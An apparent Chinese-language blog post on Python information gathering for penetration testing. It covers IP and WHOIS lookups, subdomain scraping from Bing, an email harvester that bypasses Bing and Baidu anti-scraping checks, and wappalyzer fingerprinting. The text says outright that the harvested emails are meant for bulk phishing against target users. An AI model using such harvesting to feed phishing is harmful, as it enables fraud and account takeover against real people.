        <content type="html"><![CDATA[<p>本文主要描述使用python进行信息收集包括收集子域名和邮箱</p><span id="more"></span><h4 id="python基本操作"><a href="#python基本操作" class="headerlink" title="python基本操作"></a>python基本操作</h4><h5 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure><h5 id="快速开启http服务"><a href="#快速开启http服务" class="headerlink" title="快速开启http服务"></a>快速开启http服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000开启服务</span><br></pre></td></tr></table></figure><h5 id="升级pip"><a href="#升级pip" class="headerlink" title="升级pip"></a>升级pip</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.github.com/pypa/pip/master/contrib/get-pip.py</span><br><span class="line">python get-pip.py</span><br><span class="line">如果过程中报：zlib包，那么需要先执行：yum install zlib zlib-devel, 安装zlib，然后重新编译安装python</span><br></pre></td></tr></table></figure><h4 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h4><p>被动信息搜集主要通过搜索引擎或者社交等方式对目标资产信息进行提取，通常包括IP查询，Whois查询，子域名搜集等。进行被动信息搜集时不与目标产生交互，可以在不接触到目标系统的情况下挖掘目标信息。</p><p>主要方法：DNS解析，子域名挖掘，邮件爬取等。</p><h4 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h4><h5 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a><strong>1、概述</strong></h5><p>DNS（Domain Name System，域名系统）是一种分布式网络目录服务，主要用于域名与IP地址的相互转换，能够使用户更方便地访问互联网，而不用去记住一长串数字（能够被机器直接读取的IP）。</p><h5 id="2、IP查询"><a href="#2、IP查询" class="headerlink" title="2、IP查询"></a><strong>2、IP查询</strong></h5><p>IP查询是通过当前所获取的URL去查询对应IP地址的过程。可以利用Socket库函数中的gethostbyname()获取域名对应的IP值。</p><p>代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#IP解析</span><br><span class="line">import socket</span><br><span class="line">url=&quot;tool.chinaz.com&quot;</span><br><span class="line">print(&quot;需要扫描的URL为：&quot;+url)</span><br><span class="line">ip = socket.gethostbyname(url)</span><br><span class="line">print(&quot;解析IP地址信息：&quot;+ip)</span><br><span class="line">res = socket.getaddrinfo(url,None)</span><br><span class="line">for i in range(0,len(res)):</span><br><span class="line">    print(res[i][4][0])</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">需要扫描的URL为：www.cnblogs.com</span><br><span class="line">解析IP地址信息：101.37.115.180</span><br><span class="line">101.37.115.180</span><br><span class="line">114.55.205.139</span><br><span class="line">114.55.187.58</span><br><span class="line">101.37.113.127</span><br><span class="line">116.62.84.58</span><br></pre></td></tr></table></figure><h5 id="3、Whois查询"><a href="#3、Whois查询" class="headerlink" title="3、Whois查询"></a><strong>3、Whois查询</strong></h5><p>Whois是用来查询域名的IP以及所有者信息的传输协议。Whois相当于一个数据库，用来查询域名是否已经被注册，以及注册域名的详细信息（如域名所有人，域名注册商等）。</p><p>Python中的python-whois模块可用于Whois查询。</p><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#使用whois模块查询信息</span><br><span class="line">from whois import whois</span><br><span class="line">data=whois(&#x27;baidu.com&#x27;)#只能是域名</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;domain_name&quot;: [</span><br><span class="line">    &quot;BAIDU.COM&quot;,</span><br><span class="line">    &quot;baidu.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;registrar&quot;: &quot;MarkMonitor, Inc.&quot;,</span><br><span class="line">  &quot;whois_server&quot;: &quot;whois.markmonitor.com&quot;,</span><br><span class="line">  &quot;referral_url&quot;: null,</span><br><span class="line">  &quot;updated_date&quot;: [</span><br><span class="line">    &quot;2020-12-09 04:04:41&quot;,</span><br><span class="line">    &quot;2021-04-07 12:52:21-07:00&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;creation_date&quot;: [</span><br><span class="line">    &quot;1999-10-11 11:05:17&quot;,</span><br><span class="line">    &quot;1999-10-11 04:05:17-07:00&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;expiration_date&quot;: [</span><br><span class="line">    &quot;2026-10-11 11:05:17&quot;,</span><br><span class="line">    &quot;2026-10-11 00:00:00-07:00&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;name_servers&quot;: [</span><br><span class="line">    &quot;NS1.BAIDU.COM&quot;,</span><br><span class="line">    &quot;NS2.BAIDU.COM&quot;,</span><br><span class="line">    &quot;NS3.BAIDU.COM&quot;,</span><br><span class="line">    &quot;NS4.BAIDU.COM&quot;,</span><br><span class="line">    &quot;NS7.BAIDU.COM&quot;,</span><br><span class="line">    &quot;ns2.baidu.com&quot;,</span><br><span class="line">    &quot;ns3.baidu.com&quot;,</span><br><span class="line">    &quot;ns1.baidu.com&quot;,</span><br><span class="line">    &quot;ns4.baidu.com&quot;,</span><br><span class="line">    &quot;ns7.baidu.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;status&quot;: [</span><br><span class="line">    &quot;clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited&quot;,</span><br><span class="line">    &quot;clientTransferProhibited https://icann.org/epp#clientTransferProhibited&quot;,</span><br><span class="line">    &quot;clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited&quot;,</span><br><span class="line">    &quot;serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited&quot;,</span><br><span class="line">    &quot;serverTransferProhibited https://icann.org/epp#serverTransferProhibited&quot;,</span><br><span class="line">    &quot;serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited&quot;,</span><br><span class="line">    &quot;clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)&quot;,</span><br><span class="line">    &quot;clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)&quot;,</span><br><span class="line">    &quot;clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)&quot;,</span><br><span class="line">    &quot;serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)&quot;,</span><br><span class="line">    &quot;serverTransferProhibited (https://www.icann.org/epp#serverTransferProhibited)&quot;,</span><br><span class="line">    &quot;serverDeleteProhibited (https://www.icann.org/epp#serverDeleteProhibited)&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;emails&quot;: [</span><br><span class="line">    &quot;abusecomplaints@markmonitor.com&quot;,</span><br><span class="line">    &quot;whoisrequest@markmonitor.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;dnssec&quot;: &quot;unsigned&quot;,</span><br><span class="line">  &quot;name&quot;: null,</span><br><span class="line">  &quot;org&quot;: &quot;Beijing Baidu Netcom Science Technology Co., Ltd.&quot;,</span><br><span class="line">  &quot;address&quot;: null,</span><br><span class="line">  &quot;city&quot;: null,</span><br><span class="line">  &quot;state&quot;: &quot;Beijing&quot;,</span><br><span class="line">  &quot;zipcode&quot;: null,</span><br><span class="line">  &quot;country&quot;: &quot;CN&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h4><h5 id="1、概述-1"><a href="#1、概述-1" class="headerlink" title="1、概述"></a><strong>1、概述</strong></h5><p>域名可以分为顶级域名，一级域名，二级域名等。</p><p>子域名（subdomain）是顶级域名（一级域名或父域名）的下一级。</p><p>在测试过程中，测试目标主站时如果未发现任何相关漏洞，此时通常会考虑挖掘目标系统的子域名。</p><p>子域名挖掘方法有多种，例如，搜索引擎，子域名破解，字典查询等。</p><h5 id="2、利用Python编写一个简单的子域名挖掘工具"><a href="#2、利用Python编写一个简单的子域名挖掘工具" class="headerlink" title="2、利用Python编写一个简单的子域名挖掘工具"></a><strong>2、利用Python编写一个简单的子域名挖掘工具</strong></h5><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#通过https://cn.bing.com爬取site的前pages页的搜索结果</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line"></span><br><span class="line">def bing_search(site,pages):</span><br><span class="line">    sudbomain=[]</span><br><span class="line">    headers=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&#x27;,</span><br><span class="line">        &#x27;Accept&#x27;:&#x27;*/*&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">    for i in range(1,int(pages)+1):</span><br><span class="line">        url=&quot;https://cn.bing.com/search?q=&#123;0&#125;&amp;sp=-1&amp;pq=&#123;0&#125;&amp;sc=8-9&amp;qs=n&amp;sk=&quot; \</span><br><span class="line">            &quot;&amp;cvid=C5D574DF2A5943C294A7DA02DFF96552&amp;first=&#123;1&#125;&amp;FORM=PERE&quot;.format(site,str((int(pages)-1)*10))</span><br><span class="line">        conn=requests.session()</span><br><span class="line">        try:</span><br><span class="line">            conn.get(&#x27;https://cn.bing.com&#x27;,headers=headers)</span><br><span class="line">            html = conn.get(url=url,stream=True,headers=headers,timeout=8)</span><br><span class="line">            soup =BeautifulSoup(html.content,&#x27;html.parser&#x27;)</span><br><span class="line">            job_bt=soup.findAll(&#x27;h2&#x27;)</span><br><span class="line">            for i in job_bt:</span><br><span class="line">                link=i.a.get(&#x27;href&#x27;)</span><br><span class="line">                domain=str(urlparse(link).scheme+&quot;://&quot;+urlparse(link).netloc)</span><br><span class="line">                if domain in sudbomain:</span><br><span class="line">                    pass</span><br><span class="line">                else:</span><br><span class="line">                    sudbomain.append(domain)</span><br><span class="line">                    print(domain)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(link)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    site=&quot;baidu.com&quot;</span><br><span class="line">    pages=15</span><br><span class="line">    bing_search(site, pages)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com</span><br><span class="line">http://www2.baidu.com</span><br><span class="line">http://quanjing.baidu.com</span><br><span class="line">https://huiyan.baidu.com</span><br><span class="line">https://quanmin.baidu.com</span><br><span class="line">https://bgc.map.baidu.com</span><br><span class="line">https://bsrc.baidu.com</span><br><span class="line">https://srf.baidu.com</span><br><span class="line">http://daishu.baidu.com</span><br><span class="line">https://smartprogram.baidu.com</span><br><span class="line">&#x27;NoneType&#x27; object has no attribute &#x27;get&#x27;</span><br><span class="line">https://smartprogram.baidu.com/developer/index.html</span><br></pre></td></tr></table></figure><h4 id="邮件爬取"><a href="#邮件爬取" class="headerlink" title="邮件爬取"></a>邮件爬取</h4><h5 id="1、概述-2"><a href="#1、概述-2" class="headerlink" title="1、概述"></a>1、概述</h5><p>在针对目标系统进行渗透的过程中，如果目标服务器安全性很高，通过服务器很难获取目标权限时，通常会采用社工的方式对目标服务进行进一步攻击。</p><p>针对搜索界面的相关邮件信息进行爬取、处理等操作之后。利用获得的邮箱账号批量发送钓鱼邮件，诱骗、欺诈目标用户或管理员进行账号登录或点击执行，进而获取目标系统的其权限。</p><h5 id="2、说明"><a href="#2、说明" class="headerlink" title="2、说明"></a>2、说明</h5><p>（1）确定搜索邮件的关键字，并调用bing_search()和baidu_search()两个函数，返回Bing与百度两大搜索引擎的查询结果。由获取到的结果进行列表合并，去重之后，循环输出。</p><p>（2）用Bing搜索引擎进行邮件爬取。Bing引擎具有反爬防护，会通过限定referer、cookie等信息来确定是否网页爬取操作。可以通过指定referer与requeses.session()函数自动获取cookie信息，绕过Bing搜索引擎的反爬防护。</p><p>（3）用百度搜索引擎进行邮件爬取。百度搜索引擎同样设定了反爬防护，相对Bing来说，百度不仅对referer和cookie进行校验，还同时在页面中通过JavaScript语句进行动态请求链接，从而导致不能动态获取页面中的信息。可以通过对链接的提取，在进行request请求，从而绕过反爬设置。</p><p>（4）通过正则表达式获取邮箱号码。此处也可以换成目标企业邮箱的正则表达式。</p><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import getopt</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">def headers(referer):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&#x27;,</span><br><span class="line">        &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;,</span><br><span class="line">        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class="line">        &#x27;Referer&#x27;: referer</span><br><span class="line">    &#125;</span><br><span class="line">    return headers</span><br><span class="line">def launcher(url, pages):</span><br><span class="line">    email_num=[]</span><br><span class="line">    key_words=[&#x27;email&#x27;,&#x27;mail&#x27;,&#x27;mailbos&#x27;,&#x27;邮件&#x27;,&#x27;邮箱&#x27;,&#x27;postbox&#x27;]</span><br><span class="line">    for page in range(1,int(pages)+1):</span><br><span class="line">        for key_word in key_words:</span><br><span class="line">            bing_emails=bing_search(url,page,key_word)</span><br><span class="line">            baidu_emails=baidu_search(url, page, key_word)</span><br><span class="line">            sum_emails=bing_emails+baidu_emails</span><br><span class="line">            for email in sum_emails:</span><br><span class="line">                if email in email_num:</span><br><span class="line">                    pass</span><br><span class="line">                else:</span><br><span class="line">                    print(email)</span><br><span class="line">def bing_search(url, page, key_word):</span><br><span class="line">    referer = &quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;sp=-1&amp;pq=emailsite%3abaidu.com&amp;first=1&amp;FORM=PERE1&quot;</span><br><span class="line">    conn = requests.session()</span><br><span class="line">    bing_url = &quot;http://cn.bing.com/search?q=&quot; + key_word + &quot;+site%3a&quot; + url + &quot;&amp;qa=n&amp;sp=-1&amp;pq=&quot; + key_word + &quot;site%3a&quot; + url + &quot;&amp;first=&quot; + str(</span><br><span class="line">        (page - 1) * 10) + &quot;&amp;FORM=PERE1&quot;</span><br><span class="line">    conn.get(&#x27;http://cn.bing.com&#x27;, headers=headers(referer))</span><br><span class="line">    r = conn.get(bing_url, stream=True, headers=headers(referer), timeout=8)</span><br><span class="line">    emails = search_email(r.text)</span><br><span class="line">    return emails</span><br><span class="line">def baidu_search(url, page, key_word):</span><br><span class="line">    email_list = []</span><br><span class="line">    emails = []</span><br><span class="line">    referer = &quot;https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1&quot;</span><br><span class="line">    baidu_url = &quot;https://www.baidu.com/s?wd=&quot; + key_word + &quot;+site%3A&quot; + url + &quot;&amp;pn=&quot; + str((page - 1) * 10)</span><br><span class="line">    conn = requests.session()</span><br><span class="line">    conn.get(baidu_url, headers=headers(referer))</span><br><span class="line">    r = conn.get(baidu_url, headers=headers(referer))</span><br><span class="line">    soup = BeautifulSoup(r.text, &#x27;lxml&#x27;)</span><br><span class="line">    tagh3 = soup.find_all(&#x27;h3&#x27;)</span><br><span class="line">    for h3 in tagh3:</span><br><span class="line">        href = h3.find(&#x27;a&#x27;).get(&#x27;href&#x27;)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(href, headers=headers(referer))</span><br><span class="line">            emails = search_email(r.text)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        for email in emails:</span><br><span class="line">            email_list.append(email)</span><br><span class="line">    return email_list</span><br><span class="line">def search_email(html):</span><br><span class="line">    emails=re.findall(r&quot;[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+&quot;,html,re.I)</span><br><span class="line">    return emails</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;baidu.com&quot;</span><br><span class="line">    pages = 1</span><br><span class="line">    launcher(url, pages)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abcdefg@mail.com</span><br><span class="line">abcdefg@sina.com</span><br><span class="line">abcdefg@163.com</span><br><span class="line">abcdefg@sohu.com</span><br><span class="line">abcdefg@qq.com</span><br></pre></td></tr></table></figure><h4 id="wappalyzer库"><a href="#wappalyzer库" class="headerlink" title="wappalyzer库"></a>wappalyzer库</h4><p>使用这个库需要先安装好npm然后才能使用代码</p><h5 id="在Windows下安装npm–nodejs"><a href="#在Windows下安装npm–nodejs" class="headerlink" title="在Windows下安装npm–nodejs"></a>在Windows下安装npm–nodejs</h5><p>官网：<a href="https://nodejs.org/en/%E9%80%89%E6%8B%A9%E9%95%BF%E6%9C%9F%E6%94%AF%E6%8C%81%E7%9A%84%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%98%AF%E4%B8%80%E4%B8%AAmsi%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%89%E4%B8%AA%E9%80%89%E9%A1%B9%E8%83%BD%E5%A4%9F%E6%B7%BB%E5%8A%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">https://nodejs.org/en/选择长期支持的进行下载是一个msi文件，有个选项能够添加环境变量</a></p><p>进入安装目录查看：</p><ul><li>node_modules文件夹表示模块</li><li>node.exe表示对应的node.js程序</li><li>npm.cmd表示对应的包管理器</li></ul><p>验证成功</p><ul><li>进入path环境变量是否有node这个新增项</li><li>使用cmd运行node -v命令查看版本</li><li>使用cmd运行npm -v命令查看npm版本</li></ul><p>修改缓存目录</p><ul><li><p>默认的缓存目录在C:\Users\admin\AppData\Roaming</p></li><li><p>使用命令会改变对应的缓存目录，下面这两个文件必须存在，先新建然后执行下面的命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;D:\Python\node\node-global&quot;</span><br><span class="line">npm config set cache &quot;D:\Python\node\npm-cache&quot;</span><br></pre></td></tr></table></figure><p>基本用法</p><ul><li>查看npm本地仓库（现在拥有所有的模块）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm list -global</span><br></pre></td></tr></table></figure><ul><li>配置镜像站，提升速度</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry=http://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><ul><li>查看所有的配置信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config list：C:\Users\Administrator\.npmrc关注这个配置文件</span><br></pre></td></tr></table></figure><ul><li>检查一下镜像站是否可行（可能需要管理员权限）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令1：npm config get registry</span><br><span class="line">命令2：npm info vue 看看能否获得vue的信息。</span><br></pre></td></tr></table></figure><ul><li>如果使用npm install命令报错，新建一个系统环境变量NODE_PATH；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内容：D:\Python\node\node-global\node_modules；</span><br></pre></td></tr></table></figure><ul><li>安装或者更新命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install 安装或者更更新命令</span><br><span class="line">如npm install npm -g：第二个npm表示模块名称，-g表示安装到上面设置的global目录</span><br><span class="line">如npm install vue -g：安装vue模块，-g表示安装到global全局目录中</span><br><span class="line">如npm install vue-router -g：安装vue-router模块，-g表示安装到global全局目录中</span><br><span class="line">如npm install vue-cli -g：安装vue-cli模块，-g表示安装到global全局目录中</span><br><span class="line">如npm install wappalyzer -g：安装wappalyzer模块，-g表示安装到global全局目录中</span><br><span class="line">上诉操作可以在D:\Python\node\node-global\node_modules目录中找到对应的文件夹，或者再次npm list -global查看是否安装成功</span><br></pre></td></tr></table></figure><ul><li>hint:</li></ul><p>运行vue显示找不到命令，因为vue在global中不在path系统环境变量中，在D:\Python\node\node-global能看到vue.cmd文件，然后在path最后一行添加：D:\Python\node\node-global，然后在cmd中使用命令vue -V(大写V)查看vue版本</p><h5 id="wappalyzer基本用法"><a href="#wappalyzer基本用法" class="headerlink" title="wappalyzer基本用法"></a>wappalyzer基本用法</h5><p>配置好相关的环境之后继续后面的操作：在Windows中安装npm–nodejs</p><ul><li>如何查看是否安装成功wappalyzer</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.在cmd中使用命令安装wappalyzer 模块：npm install wappalyzer -g</span><br><span class="line">2.在cmd中使用命令wappalyzer可以看到相关的参数的对应的用法和解释</span><br><span class="line">3.在cmd中使用命令：wappalyzer http://www.baidu.com可以对百度进行解析</span><br></pre></td></tr></table></figure><ul><li>python执行cmd命令的基本用法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用import subprocess这个库</span><br><span class="line"># #执行命令ping www.baidu.com</span><br><span class="line"># #res=subprocess.run([&#x27;ping&#x27;,&#x27;www.baidu.com&#x27;],shell=True,stdout=subprocess.PIPE).stdout.decode(&#x27;gbk&#x27;)</span><br><span class="line"># #print(res)</span><br></pre></td></tr></table></figure><ul><li>python中使用wappalyzer</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用subprocess和wappalyzer库subprocess.run([&#x27;wappalyzer&#x27;,&#x27;https://www.baidu.com&#x27;],shell=True,stdout=subprocess.PIPE).res.stdout.decode()</span><br><span class="line"># #设置执行的命令wappalyzer https://www.baidu.com</span><br></pre></td></tr></table></figure><ul><li>具体代码</li></ul><p><a href="http://c.biancheng.net/view/2212.html%E7%94%A8%E4%BA%8E%E8%A7%A3%E6%9E%90%E5%AD%97%E5%85%B8">http://c.biancheng.net/view/2212.html用于解析字典</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import json</span><br><span class="line">res =subprocess.run([&#x27;wappalyzer&#x27;,&#x27;http://www.baidu.com&#x27;],shell=True,stdout=subprocess.PIPE)#设置执行的命令wappalyzer https://www.baidu.com</span><br><span class="line">set_res=res.stdout.decode()#使用decode将字节转换成str，返回</span><br><span class="line">dict=json.loads(set_res)#把json换成dict字典</span><br><span class="line">print(dict)</span><br><span class="line">print(len(dict))</span><br><span class="line">print(dict.get(&#x27;urls&#x27;))</span><br><span class="line">d=dict.get(&#x27;technologies&#x27;)[0]</span><br><span class="line">print(d.get(&#x27;website&#x27;))</span><br><span class="line"># #设置执行的命令wappalyzer https://www.baidu.com</span><br><span class="line">#res=subprocess.run([&#x27;wappalyzer&#x27;,&#x27;https://www.baidu.com&#x27;],shell=True,stdout=subprocess.PIPE).res.stdout.decode()</span><br><span class="line"># #使用decode将字节转换成str</span><br><span class="line"># #print(res)</span><br></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/3cH0-Nu1L/p/14698655.html">https://www.cnblogs.com/3cH0-Nu1L/p/14698655.html</a></p><p><a href="https://www.cnblogs.com/ms08067/">https://www.cnblogs.com/ms08067/</a></p><p><a href="https://www.cnblogs.com/jianguo221/p/11487532.html">https://www.cnblogs.com/jianguo221/p/11487532.html</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> python </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim常用命令</title>
